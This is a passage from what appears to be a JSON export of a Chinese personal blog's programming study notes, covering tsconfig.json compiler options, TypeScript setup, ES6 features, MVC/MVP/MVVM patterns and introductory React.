checkjs（是否检查js文件的语法）\ntsconfig.json的核心compilerOptions，compilerOptions的主要配置分别为target（指定ts编译的目标。例如ES2020，ES5，ESNext等等），module（设置ts使用的模块化系统，当target为ES3，ES5时，module默认为Commonjs，当target为es6或者更高时，默认值为ES6，支持ES2020，UMD，AMD，System，ESNext，以及None选项），jsx（指定jsx文件转译为js文件的输出方式，只影响.tsx文件的输出，支持react，react-jsx，react-jsxdev，preserve，react-native），incremental（表示是否启动增量编译，如果为true时，会将上次编译的工程图信息存储在磁盘上），declaration（表示是否为项目的ts或者js文件生成.d.ts文件，如果需要指定声明文件存储位置，可使用declarationDir属性指定目录，如果只想生成声明文件则可以开启emitDeclarationOnly属性，开启该属性，将不会生成js文件，只生成声明文件，设置声明文件目录，可使用typeRoots属性，该属性默认值为node_modules/@types，这个属性值为数组，可传入1个或者多个声明文件目录，如果只想使用指定声明文件，则可以使用types属性，这个属性值也是一个数组，只有包含在内的声明文件才能被加载引用），sourceMap（是否生成sourcemap文件，sourcemap文件将以.js.map或者.jsx.map的形式被生成与.js文件或者.jsx文件同级目录下，sourcemap文件可以允许调试器和其他工具在生成js文件时，显示原来的ts代码，如果需要生成inlineSourceMap格式的map文件，则需要开启inlineSourceMap属性，这个属性不能与sourceMap属性一起用，声明文件也想生成sourceMap文件，开启declarationMap属性即可），lib（控制lib.d.ts声明文件的库定义文件）\n如果需要开启输出诊断信息，则true一下diagnostics属性，会输出编译时的信息，例如编译时间（Total time）\nallowUmdGlobalAccess，是否允许在模块中以全局变量的方式来访问UMD模块\nmoduleResolution，模块解析的策略，默认为node（相对，非相对导入模块），还有classic策略（该策略，相对导入会解析同级目录下的ts，.d.ts文件，非相对导入会通过node_modules目录来查找模块，如果本级没有，会向上级查找，该模式可用于AMD，System，ES2015模块标准）\n如果开启了incremental增量编译，会生成一个tsconfig.tsbuildinfo的文件，这个文件是增量编译的依赖文件，如果需要指定增量编译的依赖文件的存储位置，可以使用tsBuildInfoFile属性\noutFile属性是将多个互相依赖的文件整合成一个文件，一般用于AMD模块标准中，属性值是被整合成的文件名以及路径\n编译阶段去除全部注释：使用removeComments属性，设置为true\n如果编译阶段不想输出文件（就是只编译不生成），可开启noEmit属性\n如果想编译阶段发生错误时不输出文件，可开启noEmitOnErrot属性\n如果在编译时不生成helper工具函数，可开启noEmitHelpers属性，并且搭配ts-helpers包使用（如果不搭配该包使用，会导致__extends方法未定义），也可以搭配importHelpers属性使用，开启该属性会使用tslib来引入helper函数（tslib就包含了__extends方法），但是这个文件必须模块，helper工具函数会增加文件体积\n如果想ES3或者ES5使用迭代器（降级使用迭代器），可开启downlevelIteration属性，例如扩展符的实现支持是通过helper工具函数的__spread方法来完成的\n开启严格模式，strict，为true时， alwaysStrict（是否对代码注入use strict），noImplicitAny（是否不允许隐式的any类型，开启后必须有类型注解），strictNullChecks（是否不允许将null，undefined赋值给其他类型的变量），strictFunctionTypes（是否不允许函数参数双向协变），strictBindCallApply（是否使用严格的bind，call，apply检查，开启后bind，call，apply的指向不能为空（undefined，null），并且严格按照类型传值），strictPropertyInitialization（类的实例属性是否必须初始化，开启后必须对类的实例进行初始化），noImplicitThis（是否不允许this存在隐式的any类型，由于ts对this类型检查不好，因此会对this使用any类型，开启后this将不允许存在any类型）属性都将默认为true\n如果还需要额外的进行检查，可开启noUnusedLocals（是否不允许存在只声明，但是不使用的局部变量），noUnusedParameters（是否不允许未使用的函数参数），noImplicitReturns（函数中是否必须要有返回值），noFallthroughCasesInSwitch（是否不允许switch语句的case贯穿（fallthrough错误））属性\nswitch语句的case贯穿：当switch语句没有break时，switch语句会依次执行\n模块解析策略，moduleResolution，当mould配置为AMD，UMD，System，ES6时，默认为classic，否则为node\n设置基准目录，baseUrl，解析非绝对路径模块名时的基准目录，当为\u0026rsquo;./\u0026lsquo;时，表示在tsconfig.json所在的目录开始查找文件\n路径设置，paths，将模块路径映射到相对于baseUrl定位的其他路径配置，例如：\n\u0026quot;paths\u0026quot;: {\r\u0026quot;@src/*\u0026quot;: [\u0026quot;src/*\u0026quot;],\r\u0026quot;test\u0026quot;: [\u0026quot;src/test/test.ts\u0026quot;]\r}\r...\rimport test from 'test'\r指定多个目录作为根目录（创建一个虚拟目录），rootDirs，允许编译器在这些目录中解析相对于的模块导入，例如：\n'rootDirs': ['src','build']\r这个将表示src目录和build目录属于同一个虚拟目录，如果build目录存在依赖，但是ts源码文件在src目录下，需要使用build目录的依赖时，可以使用这个，不需要编译后再修改依赖路径\n指定类型文件的根目录，typeRoots，默认node_modules/@types下的包都是可见的，如果指定了typeRoots将表示从该目录里查找类型文件\n指定全局范围的包，types，默认情况下typeRoots的包都会被包含到编译过程中，除非指定types，只有列出的包才能被包含在全局范围中，例如：\n\u0026quot;types\u0026quot;: ['node','jest','express']\r如果想在编译阶段打印输出的文件，可开启listEmittedFiles属性\n如果想在编译阶段打印进行编译的文件（其中包括引用的声明文件），可开启listFiles属性\nallowSyntheticDefaultImports表示是否允许默认导出，当为true时表示一个模块没有默认导出，也认为其他模块也能像默认导出一样导入使用该模块\nesModuleInterop表示是否开启ES模块的互操作，可以使用ES模块的方式导入Commonjs包，当模块没有类型时，可直接require()方式引用，如果具备类型声明，那么需要使用import的方式导入，开启该选项，会默认开启allowSyntheticDefaultImports\n开启esModuleInterop属性，将允许export = xxx的形式导出，并且使用import = xxx 的方式导入\nsourceRoot表示指定调试器需要定位的ts文件位置，而不是相对于源文件的路径\nmapRoot表示指定调试器需要定位的sourcemap文件的位置，而不是生成的文件位置\ninlineSourceMap是否开启将sourcemap文件内容生成内联字符串的方式写入到对于的js文件中，而不是生成.js.map文件\ninlineSources，是否开启将源文件的所有内容生成内联字符并且写入到sourcemap文件中，和inlineSourceMap功能类似\nexperimentalDecorators，是否开启装饰器的特性\nemitDecoratorMetadata，是否允许装饰器使用反射数据的特性\nskipLibCheck，表示是否可以跳过检查声明文件，开启可以省去不少编译时间，但是会牺牲类型系统的准确性\n因为ts是大小写敏感的，为了避免开发者在不同大小写敏感规则下的操作系统下开发而导致的问题，可以开启forceConsistentCasingInFileNames，开启该选项表示当开发者正在使用和系统不一致的大小写入规则时，会抛出错误\nfiles表示指定ts项目需要包含的文件列表\ninclude表示指定需要包含在ts项目的文件或者文件匹配路径，如果配置了files，那么默认值为[]，如果没有设置默认值为[\u0026rsquo;**/*\u0026rsquo;]，就是包含目录下的所有文件\nexclude表示指定解析include配置中需要跳过的文件或者文件匹配路径，例如node_modules\nextends配置指为字符串，表示声明当前配置需要继承另一个配置的路径，ts会向加载extends的配置文件，在使用当前的tsconfig.json文件的配置来覆盖继承文件里的配置\n","permalink":"https://99999.fun/posts/58/","summary":"TypeScript设计目标是开发大型项目，编译成纯JavaScript，让其可以运行在任何浏览器上\nTypeScript可以增强IDE的交互和反馈，主流IDE都支持TypeScript\nTypeScript实质上就是JavaScript的扩展，JavaScript超集\nTypeScript具备类型检查，静态类型，JSnext属性和方法，以及还在提案阶段的语法（例如装饰器）\nTypeScript本身并不能在浏览器运行，需要进行编译成JavaScript（tsc编译）\n全局安装typescript\nyarn global add typescript\n或者\nnpm install -g typescript\n安装ts-node（node不能直接运行ts文件，需要安装ts-node包）\nnpm install -g ts-node\nts-node运行（不需要编译成js文件，直接运行ts）\nts-node hallo.ts\n检查是否安装成功\ntsc -v\n使用TypeScript编写的文件统一以.ts为后缀，用ts写React，统一以.tsx为后缀\n创建tsconfig.json\nnpx tsc \u0026ndash;init\n执行（不加任何参数，这样才能使用tsconfig.json配置文件，tsc默认对当前根目录的ts文件进行编译）\ntsc\n或者指定编译的文件\ntsc ./src/index.ts\ntsc ./src/index.ts -t es6 -m cjs\n注意：cjs标准只能存在一个顶级导出（mudule.exports）,如果存在其他exports的话会被忽略，因此要么不用mudule.exports，要么只使用一个mudule.exports\n编译指定ts文件（在compilerOptions同级）\n\u0026ldquo;include\u0026rdquo;:[\u0026quot;./test1.ts\u0026quot;] // 指定编译哪个ts文件 \u0026ldquo;excclude\u0026rdquo;:[\u0026quot;./test.ts\u0026quot;] // 指定不编译哪个ts文件\n编译TypeScript文件\ntsc hallo.ts\n变量声明\n推荐使用const和let声明变量，而不要使用var声明（因为var具有变量提升和重定义）\n基础类型\nTypeScript具有强类型的特点\nboolean，string，number，array，null，undefined，object，tuple，enum，void，never，any\nboolean布尔值，例如：\nlet hallo: boolean = true\nnumber数值，例如：\nlet hallo: number = 123;","title":"TypeScript学习笔记"},{"content":"ECMAScript\nJavaScript的创造者Netscape将其提交给标准化组织ECMA，因此JavaScript的标准是ECMAScript\nECMAScript是规范，JavaScript是实现\nES6又叫ECMAScript2015，因为标准委员会决定每年的6月份正式发布标准，作为当年的正式标准，使用年份来标记，不需要之前的版本号了\n变量\nlet关键字声明变量，使用let声明的变量具有块级作用域有效的特性\n例如：\nif(true){\rlet a = 666;\r}\rconsole.log(a); // Uncaught ReferenceError: a is not defined\r注意：\n使用var声明的变量不具备块级作用域有效的特性\n使用let声明的变量不存在变量提升，只能先声明后使用，具有暂时性死区特性，绑定在块级作用域，不会受外部污染或者影响，let不允许在同一个作用域中，重复声明同一个变量\nconst声明一个只读的常量，一声明，常量的值将不能改变\nconst abc =123;\nconst一旦声明将立刻初始化，只声明不赋值是会报错的，同样不存在变量提升，存在暂时性死区\nES6的作用域：\n全局作用域 函数作用域 块级作用域\n因为部分低版本浏览器还不支持ES6，因此有一些工具可以ES6语法转ES5的语法，例如：babel\n安装babel\nnpm install -g babel-cli\n安装转换包\nnpm install \u0026ndash;save-dev babel-preset-es2015 babel-cli\n新建.babelrc文件，写入：\n{\r\u0026quot;presets\u0026quot;:[\r\u0026quot;es2015\u0026quot;\r],\r\u0026quot;plugins\u0026quot;:[]\r}\rbabel main.js -o src/main.js\n然后就成功将ES6语法转为ES5的语法，提高浏览器兼容性\n变量声明方式\nlet，声明一个变量\nconst，声明一个常量\n在ES6中，var是声明全局变量的，而let声明的变量是具有块级作用域的，只能在当前语句块中访问调用\nlet实质上就是为了避免污染全局的设计的，希望在某个语句结束后销毁该变量，而不会影响语句外部的变量\nconst实质就是为了保证该变量始终不变而设计的，使用const声明的变量，不能进行修改，否则会抛出错误\n变量解构\nES6允许从数组或者对象中获取值，来对变量进行赋值，这个又被称为解构，例如：\nlet [a,b,c] = [1,2,3]\n会根据位置的关系来进行变量的赋值，格式一定要相同，否则可能获取undefined\n当然，解构赋值也允许使用默认值（在没有进行赋值时，会使用该默认值来代替，当进行赋值时，会该默认值），例如：\nlet [a,b=\u0026ldquo;hello\u0026rdquo;] = [\u0026ldquo;word\u0026rdquo;]\nconsole.log(b+a) // helloword\n对象解构\nlet {name,pass} = {name:\u0026ldquo;root\u0026rdquo;,pass:\u0026ldquo;123\u0026rdquo;}\nconsole.log(name+pass)\n注意：如果变量已经声明了，直接进行解构会抛出错误\n解决方式：在解构语句块外部使用圆括号()包裹起来就好了\n字符串解构\nlet [a,b,c] =\u0026ldquo;abc\u0026rdquo;\nconsole.log(a+b+c)\n扩展运算符\n当某个函数或者方法中，传入的参数个数是不确定的时候，就可以使用该来作为参数，例如：\nfunction abc(...name){\rconsole.log(name[0])\rconsole.log(name[1])\r}\rabc(\u0026quot;hallo\u0026quot;,\u0026quot;word\u0026quot;)\rrest运算符（和扩展运算符相反，合并为一个数组）\nfunction abc(a,...name){\rconsole.log(a);\rconsole.log(name);\r}\rabc(\u0026quot;hallo\u0026quot;,\u0026quot;word\u0026quot;,\u0026quot;yes\u0026quot;)\r字符串模板\nlet name = \u0026ldquo;root\u0026rdquo;\nlet data = `hallo ${name} 来到`\nconsole.log(data)\n当然也支持插入htm标签，例如：\nlet data = `hallo ${name} 来到`\ndocument.write(data)\n也可以在模板中进行运算\nlet [a,b,c] = [1,2,3]\nlet abc = `${a+b+c}`\nconsole.log(abc)\n判断字符串是否存在\nlet name = \u0026ldquo;root\u0026rdquo;\nlet data = \u0026ldquo;hallo root\u0026rdquo;\nconsole.log(data.includes(name)) // true\n判断开头是否存在\ndata.startsWith(name)\n判断结尾是否存在\ndata.endsWith(name)\n箭头函数\nlet abc = (a,b,c) =\u0026gt;{\rconsole.log(a+b+c)\r}\rabc(1,2,3)\r注意：箭头函数不能作为构造函数使用\n对象的函数解构\nlet obj = {\ra: \u0026quot;hallo\u0026quot;,\rb: \u0026quot;word\u0026quot;\r}\rfunction abc({a,b}){\rconsole.log(a,b)\r}\rabc(obj) // hallo word\r数组的函数结构\nlet arr = [\u0026quot;hallo\u0026quot;,\u0026quot;word\u0026quot;]\rfunction abc(a,b){\rconsole.log(a,b)\r}\rabc(...arr)\r判断对象或者数组中是否存在某个值\nlet obj = {\ra: \u0026quot;hallo\u0026quot;\r}\rconsole.log(\u0026quot;a\u0026quot; in obj)\r对象\nES6允许将已经声明的变量直接赋值给对象，例如：\nlet abc = \u0026ldquo;hallo\u0026rdquo; let xyz = \u0026ldquo;word\u0026rdquo; let obj = {abc,xyz} console.log(obj)\n对象键值\nlet data = \u0026ldquo;name\u0026rdquo; let obj = {[data]: \u0026ldquo;root\u0026rdquo;} console.log(obj)\n允许通过变量来传递对象值\nlet name = \u0026ldquo;root\u0026rdquo; let pass = \u0026ldquo;123\u0026rdquo; let obj= {name,pass} console.log(obj)\n自定义对象方法\nlet obj={\radd:function(a,b){\rreturn a+b\r}\r}\rconsole.log(obj.add(1,2))\rObject.is：严格模式相等\nconsole.log(Object.is(NaN,NaN)) console.log(NaN === NaN)\n===只是值相等，但是is是绝对相等，不只是值，连数据类型也是\n合并对象Object.assign()\nlet a={a:\u0026lsquo;hallo\u0026rsquo;} let b={b:\u0026lsquo;hahaha\u0026rsquo;} let c={c:\u0026lsquo;wowowo\u0026rsquo;} let abc=Object.assign(a,b,c) console.log(abc)\njson转为数组（json需要提供length属性）\nlet json = {\r'0': 'a',\r'1': 'b',\r'2': 'c',\rlength:3\r}\rlet arr=Array.from(json)\rconsole.log(arr)\r转换数组（Array.of）\nlet arr =Array.of(1,2,3)\rconsole.log(arr)\rtoString()数组转字符串\nlet arr=['hallo','abc','xyz']\rconsole.log(arr.toString())\rarr.find（可以查找一个数组是否存在某个值或者可以查找某个索引值的元素是什么）\nlet arr=[1,2,3,4,5,6,7,8,9]\rlet data=arr.find(function(value,index,arr){\rreturn value == 6\r})\rconsole.log(data)\rvalue是当前要查找的值，index是当前要查找的索引值，arr是当前数组\n填充数组\nlet arr=[0,1,2,3,4,5,6,7,8,9]\rarr.fill('hallo',3,5)\rconsole.log(arr)\rfor\u0026hellip;of\n这个方法比普通的for循环好用，因为它不需要提供判断区域，会遍历全部的元素\nlet arr=['abc','xyz','hallo']\rfor (let item of arr){\rconsole.log(item)\r}\r如果想遍历数组的索引值，可以用arr.keys()\n迭代化数组（迭代对象中数组的索引值作为 key，数组元素作为 value，例如：[0, \u0026lsquo;abc\u0026rsquo;]）\nlet arr=['abc','xyz','hallo']\rlet list=arr.entries()\rconsole.log(list.next().value)\rconsole.log(list.next().value)\rconsole.log(list.next().value)\r主动抛出错误\nfunction add(a,b){\rif(a == 0){\rthrow new Error('This is error')\r}\rreturn a+b\r}\rconsole.log(add(0,1))\r除了外部程序外可以使用严谨模式，函数体内也可以使用\u0026rsquo;use strict\u0026rsquo;，可以用来针对函数体内部\nforEach()遍历数组（可以获取索引值和元素值）\nlet arr=['abc','xyz','hallo']\rarr.forEach((val,index)=\u0026gt;console.log(index,val))\rfilter遍历数组\nlet arr=['abc','xyz','hallo']\rarr.filter(i=\u0026gt;console.log(i))\r判断某个数组里面的值是否符合某个条件（返回布尔值）\nlet arr = [1,2,3]\rlet data = (a) =\u0026gt; a \u0026gt; 1\rconsole.log(arr.some(data))\r因为arr.some()会遍历元素，当找到一个符合条件的就结束遍历，返回值，因此也可以用来遍历数组，例如：\nlet arr = [1,2,3]\rarr.some(a=\u0026gt;console.log(a))\r但是这个方法有个不好的点就是，会一直遍历，当索引不到值的时候会结束遍历，并且返回false\nmap()\nlet arr = [1,2,3]\rlet arrs = arr.map(a =\u0026gt; \u0026quot;hallo\u0026quot;)\rlet data = arr.map(Math.sqrt)\rconsole.log(arrs)\rconsole.log(data)\rmap()可以索引全部元素并且通过覆盖或者科学计算来修改数组的元素深拷贝到另一个变量中，当然也可以进行普通的遍历\njoin()可以在数组元素后面添加字符串（间隔）\nlet arr=['abc','xyz','hallo']\rconsole.log(arr.join(','))\rGenerator函数，该函数和普通函数不同，其是可以暂停执行，例如：\nfunction* add(x){\rlet y = yield x + 1\rreturn y\r}\rlet a = add(1)\rlet abc = a.next()\rconsole.log(\u0026quot;值\u0026quot;+\u0026quot;:\u0026quot; + abc.value)\rconsole.log(abc.done === true ? \u0026quot;没有执行完毕\u0026quot; : \u0026quot;执行完毕\u0026quot; )\rGenerator函数实质上就是一个被封装的异步容器，需要暂停的地方，可以使用yield语句标注\nGenerator函数执行后不会返回结果，而是返回指针，调用指针a的next来移动内部的指针\nnext方法作用就是分段执行Generator函数，每调用一次next，都返回一个对象，该对象有value属性和done属性，value属性是值，done属性是布尔值，表示是否执行完毕\nSymbol是一个新的数据类型\nlet sym = Symbol(\u0026lsquo;abc\u0026rsquo;) console.log(sym) console.log(sym.toString()) console.log(typeof(sym))\nSymbol特点就是一个值和另一个值是不相等的，例如：\nlet sym1 = Symbol(\u0026lsquo;abc\u0026rsquo;) let sym2 = Symbol(\u0026lsquo;abc\u0026rsquo;) console.log(sym1 === sym2)\nSet数据结构\nlet setArr = new Set(['abc','xyz','hallo'])\rsetArr.add('abc')\rsetArr.add('123')\rsetArr.delete(\u0026quot;xyz\u0026quot;)\rconsole.log(setArr.has(\u0026quot;xyz\u0026quot;))\rconsole.log(setArr)\rfor (let item of setArr){\rconsole.log(item)\r}\rconsole.log(setArr.size)\rsetArr.clear()\rSet的特点就是内部元素不能出现重复值的，可以理解为去重\n使用Set实例化的，可以通过add()方法来添加元素\ndelete()方法为删除某个元素\nhas查找（返回布尔值）\nclear()清空全部元素\nsetArr.size可以获取元素个数\nMap数据结构\nlet json = {\rname:'root',\rpass:'123'\r}\rlet map=new Map()\rmap.set(json,'hallo')\rconsole.log(map)\r存值\nmap.set(\u0026lsquo;abc\u0026rsquo;, \u0026ldquo;xyz\u0026rdquo;)\n获取值（获取json对应的值）\nconsole.log(map.get(json))\n删除指定值\nmap.delete(json) console.log(map)\n获取\nconsole.log(map.size)\nhas查找\nconsole.log(map.has(\u0026lsquo;abc\u0026rsquo;))\n清空元素\nmap.clear()\nPromise\nPromise有三个状态，pending: 初始，fulfilled: 成功，rejected: 失败\nPromise可以将异步以同步方式来操作，例如：\nlet abc = new Promise((resolve, reject) =\u0026gt; {\rsetTimeout(() =\u0026gt; {\rconsole.log('hallo')\rresolve('yes')\rconsole.log('执行完成')\r}, 1000)\r})\rabc.then((data) =\u0026gt; {\rconsole.log('resolved',data)\r}).catch((err) =\u0026gt; {\rconsole.log('rejected',err)\r}\r)\rasync/await\n在async中，await执行异步操作只能一个个执行，用同步的方式来执行异步操作，例如：\nfunction req(i){\rreturn new Promise(resolve =\u0026gt;{\rsetTimeout(() =\u0026gt; {\rresolve(i * 3)\r}, 1000)\r})\r}\rasync function abc(){\rconst a = await req(2)\rconst b = await req(a)\rconsole.log(b)\r}\rabc()\r需要在Promise异步的情况下使用，否则会同时输出的\nasync返回的是一个状态为fuifilled的Promise对象，具体要看return返回值\nProxy\n","permalink":"https://99999.fun/posts/57/","summary":"ECMAScript\nJavaScript的创造者Netscape将其提交给标准化组织ECMA，因此JavaScript的标准是ECMAScript\nECMAScript是规范，JavaScript是实现\nES6又叫ECMAScript2015，因为标准委员会决定每年的6月份正式发布标准，作为当年的正式标准，使用年份来标记，不需要之前的版本号了\n变量\nlet关键字声明变量，使用let声明的变量具有块级作用域有效的特性\n例如：\nif(true){\rlet a = 666;\r}\rconsole.log(a); // Uncaught ReferenceError: a is not defined\r注意：\n使用var声明的变量不具备块级作用域有效的特性\n使用let声明的变量不存在变量提升，只能先声明后使用，具有暂时性死区特性，绑定在块级作用域，不会受外部污染或者影响，let不允许在同一个作用域中，重复声明同一个变量\nconst声明一个只读的常量，一声明，常量的值将不能改变\nconst abc =123;\nconst一旦声明将立刻初始化，只声明不赋值是会报错的，同样不存在变量提升，存在暂时性死区\nES6的作用域：\n全局作用域 函数作用域 块级作用域\n因为部分低版本浏览器还不支持ES6，因此有一些工具可以ES6语法转ES5的语法，例如：babel\n安装babel\nnpm install -g babel-cli\n安装转换包\nnpm install \u0026ndash;save-dev babel-preset-es2015 babel-cli\n新建.babelrc文件，写入：\n{\r\u0026quot;presets\u0026quot;:[\r\u0026quot;es2015\u0026quot;\r],\r\u0026quot;plugins\u0026quot;:[]\r}\rbabel main.js -o src/main.js\n然后就成功将ES6语法转为ES5的语法，提高浏览器兼容性\n变量声明方式\nlet，声明一个变量\nconst，声明一个常量\n在ES6中，var是声明全局变量的，而let声明的变量是具有块级作用域的，只能在当前语句块中访问调用\nlet实质上就是为了避免污染全局的设计的，希望在某个语句结束后销毁该变量，而不会影响语句外部的变量\nconst实质就是为了保证该变量始终不变而设计的，使用const声明的变量，不能进行修改，否则会抛出错误\n变量解构\nES6允许从数组或者对象中获取值，来对变量进行赋值，这个又被称为解构，例如：\nlet [a,b,c] = [1,2,3]\n会根据位置的关系来进行变量的赋值，格式一定要相同，否则可能获取undefined","title":"ES6学习笔记"},{"content":"MVC（Model-View-Controller）分别为View（视图，用户界面），Model（模型，数据保存），Controller（控制器，逻辑）\n视图层发指令（Dom事件）给控制器，控制器完成逻辑处理，请求模型改变状态，模型将最新的数据发送给视图，得到反馈，各个之间通信是单向的\n也可以Controller接受指令，要求模型改变状态，模型将最新的数据发送给视图\nMVP（Model-View-Presenter）实质是就是将Controller（控制器，逻辑）改为Presenter（从模型中获取数据，并且提供数据给视图）\n各个通信之间是双向的，视图和模型并不联系，通过Presenter进行传递，全部逻辑都在Presenter进行处理\nMVVM（Model-View-ViewModel）实质上就是MVC的改进版，和MVP模式基本一致，不过MVVM采用了双向绑定，视图变化，自动反映在ViewModel中\n在前端中Model是用json表示，将Model和View关联起来的是ViewModel，Mode数据可以显示到View中，也可以将View修改回Mode\n","permalink":"https://99999.fun/posts/56/","summary":"MVC（Model-View-Controller）分别为View（视图，用户界面），Model（模型，数据保存），Controller（控制器，逻辑）\n视图层发指令（Dom事件）给控制器，控制器完成逻辑处理，请求模型改变状态，模型将最新的数据发送给视图，得到反馈，各个之间通信是单向的\n也可以Controller接受指令，要求模型改变状态，模型将最新的数据发送给视图\nMVP（Model-View-Presenter）实质是就是将Controller（控制器，逻辑）改为Presenter（从模型中获取数据，并且提供数据给视图）\n各个通信之间是双向的，视图和模型并不联系，通过Presenter进行传递，全部逻辑都在Presenter进行处理\nMVVM（Model-View-ViewModel）实质上就是MVC的改进版，和MVP模式基本一致，不过MVVM采用了双向绑定，视图变化，自动反映在ViewModel中\n在前端中Model是用json表示，将Model和View关联起来的是ViewModel，Mode数据可以显示到View中，也可以将View修改回Mode","title":"简单了解MVC，MVP和MVVM之间的不同与联系"},{"content":"React是构造用户界面的JavaScript库，就是负责视图层的，只负责视图的渲染，其特点是声明式，组件化\n安装react\nnpm i react react-dom\n必需：react和react-dom\nreact包是提供创建元素，组件等功能，是核心（废话）\nreact-dom包提供DOM相关的功能\n通常还需要导入babel来解析jsx（注意：在浏览器使用babel编译jsx效率很低，babel内嵌了对于jsx的支持），babel可以将es6语法转化为es5，方便运行在不支持es6的浏览器上\n也可以通过引入src文件的方式引入cdn文件或者本地文件\n第一个例子\n\u0026lt;script type=\u0026quot;text/babel\u0026quot;\u0026gt;\rReactDOM.render(\r\u0026lt;h1\u0026gt;hallo,react!!!\u0026lt;/h1\u0026gt;,\rdocument.getElementById(\u0026quot;app\u0026quot;)\r);\r\u0026lt;/script\u0026gt;\r使用babel解析jsx，react官方推荐使用jsx，因为使用jsx渲染dom简单明了\njsx是一种JavaScript语法扩展，例如：\nconst hallo = \u0026lt;h1\u0026gt;hallo\u0026lt;/h1\u0026gt;;\r像上面这种就是jsx，jsx本身是一个表达式，经过编译（例如babel）后jsx表达式会转换成JavaScript对象（注意：jsx不是标准的ECMAScript语法，是语法的扩展，不进行编译处理，直接使用是会报错的）\n在jsx中插入JavaScript表达式，用大括号包含起来，例如：\nfunction hallo(yes){\rreturn yes.name;\r}\rconst yes = {\rname: \u0026quot;react\u0026quot;\r};\rconst hallo = \u0026lt;h1\u0026gt;hallo,{hallo(yes)}\u0026lt;/h1\u0026gt;;\rReactDOM.render(\rhallo,\rdocument.getElementById(\u0026quot;app\u0026quot;)\r);\r当然react并没有强制要求必须使用jsx，例如：\nconst hallo = React.createElement(\u0026quot;h1\u0026quot;,{class: \u0026quot;main\u0026quot;},React.createElement(\u0026quot;p\u0026quot;,null,\u0026quot;hallo word!!!\u0026quot;))\r/* 上面提供了三个参数，分别是元素名称，元素属性，元素的子节点 */\rReactDOM.render(hallo,document.getElementById(\u0026quot;app\u0026quot;))\r/* 上面提供了个两个参数，分别是要渲染的react元素，挂载点*/\rreact脚手架\n初始化项目\nnpx create-react-app app\n启动项目（在项目根目录执行）\nnpm start或者yarn start\n模块化导入react\nimport React from \u0026ldquo;react\u0026rdquo; import ReactDOM from \u0026ldquo;react-dom\u0026rdquo;\nReact元素的属性名采用驼峰命名法\nclass就需要改为className，for要改为htmlFor等等，例如：\nconst app = (\u0026lt;div className=\u0026quot;app\u0026quot;\u0026gt;hallo\u0026lt;/div\u0026gt;)\r如果一个元素中没有子节点可以直接写为\n推荐使用小括号包裹jsx，避免陷入自动插入分号陷阱\nJavaScript表达式可使用大括号{}来包裹，直接使用，例如：\nconst app = (\u0026lt;div\u0026gt;hallo，{3 \u0026lt; 8 ? \u0026quot;react\u0026quot; : \u0026quot;word\u0026quot;}\u0026lt;/div\u0026gt;)\r任何数据类型和函数调用都可以（对象除外），表示式的特点就是有值就可以，jsx本身也是个JavaScript表达式\n因为if或者for之类的语句不能出现在大括号中\n条件渲染（根据条件进行渲染指定jsx结构）\nimport React from \u0026quot;react\u0026quot;\rimport ReactDOM from \u0026quot;react-dom\u0026quot;\rconst datamain = true;\rconst hallo = () =\u0026gt; {\rif(datamain){\rreturn \u0026lt;div\u0026gt;hallo word\u0026lt;/div\u0026gt;;\r}\rreturn \u0026lt;div\u0026gt;数据加载完成\u0026lt;/div\u0026gt;;\r}\rconst app =(\r\u0026lt;div\u0026gt;\r{hallo()}\r\u0026lt;/div\u0026gt;\r)\rReactDOM.render(app,document.getElementById(\u0026quot;app\u0026quot;))\r当然也是支持三元表达式的，例如：\nconst Data = () =\u0026gt; {\rreturn datamain ? (\u0026lt;div\u0026gt;yes\u0026lt;/div\u0026gt;) : (\u0026lt;div\u0026gt;no\u0026lt;/div\u0026gt;)\r}\r列表渲染\nconst arrs = [\r{id: 1,name: \u0026quot;root\u0026quot;},\r{id: 2,name: \u0026quot;admin\u0026quot;},\r{id:3,name: \u0026quot;user\u0026quot;}\r]\rconst lists = (\r\u0026lt;ul\u0026gt;\r{arrs.map(item =\u0026gt; \u0026lt;li key={item.id}\u0026gt;{item.name}\u0026lt;/li\u0026gt;)}\r\u0026lt;/ul\u0026gt;\r)\rReactDOM.render(lists,document.getElementById(\u0026quot;app\u0026quot;))\rjsx样式\n行内样式style，类className，例如：\nconst app = (\u0026lt;div style={{color: \u0026quot;#ccc\u0026quot;}}\u0026gt;hallo\u0026lt;/div\u0026gt;)\rreact组件的概念和vue组件一样，拼装积木，重复性，独立性\n函数创建组件\n函数名开头必须大写（否则报错），函数组件必须要有返回值（否则报错），如果返回值为null，就不渲染任何内容，例如：\nfunction Hello(){\rreturn(\r\u0026lt;div\u0026gt;hallo,react\u0026lt;/div\u0026gt;\r)\r}\rReactDOM.render(\u0026lt;Hello /\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r或者\nconst Hello = () =\u0026gt; (\u0026lt;div\u0026gt;hallo,react\u0026lt;/div\u0026gt;)\r类创建组件\n同样类名开头也要是大写，而且类组件要继承React.Component父类，使用父类中的方法和属性，而且还要提供render()方法，render()还要有返回值\nclass Hello extends React.Component{\rrender(){\rreturn (\u0026lt;div\u0026gt;hallo,react\u0026lt;/div\u0026gt;)\r}\r}\rReactDOM.render(\u0026lt;Hello /\u0026gt;,document.getElementById(\u0026quot;app\u0026quot;))\r如果组件很多，应该放到单独的js文件，独立化个体，导入react，导出组件（export），用到该组件就导入\n事件绑定\nreact事件采用了驼峰命名法，比如onClick，onMouseEnter，onFocus，例如：\nclass Hello extends React.Component{\rmainClick(){\rconsole.log(\u0026quot;被点击了\u0026quot;)\r}\rrender(){\rreturn (\u0026lt;div onClick={this.mainClick}\u0026gt;hallo,react\u0026lt;/div\u0026gt;)\r}\r}\r注意：如果是函数组件，就不需要加this，直接return (hallo,react)\n事件对象\n可以通过事件处理程序的参数来获取到事件对象，在react中事件对象又叫为合成事件，兼容所有浏览器，无需担心浏览器兼容问题\n阻止浏览器的默认行为\nclass Hello extends React.Component{\rmainClick(e){\re.preventDefault();\rconsole.log(\u0026quot;被点击了\u0026quot;)\r}\rrender(){\rreturn (\u0026lt;a onClick={this.mainClick} href=\u0026quot;https://xiaochenabc123.test.com\u0026quot;\u0026gt;hallo,react\u0026lt;/a\u0026gt;)\r}\r}\r状态组件（状态即数据的更新）\n函数组件为无状态组件，类组件为有状态组件\n如果数据不需要变化就用函数组件，否则就类组件\n状态（state）是组件内部的私有数据，只能在组件内部使用，state的值是一个对象，表示组件可以存在多个数据\n第一种存储state方法\nconstructor(){\rsuper()\rthis.state ={\rcount :0\r}\r}\r第二种存储state方法（推荐）\nstate = {\rcount: 0\r}\r获取state值\nrender(){\rreturn 